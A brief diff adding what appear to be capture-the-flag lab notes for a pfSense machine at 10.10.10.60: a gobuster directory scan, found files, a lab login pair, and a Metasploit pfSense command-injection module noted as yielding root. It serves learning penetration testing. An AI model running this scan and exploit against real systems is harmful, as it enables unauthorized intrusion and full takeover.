@@ -1,0 +1,7 @@
+//based on IppSec
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -x txt --insecuressl
+/changelog.txt
+/system-users.txt
+rohit:pfsense
+
+use exploit/unix/http/pfsense_graph_injection_exec	//set rhost,lhost, username -> got root 
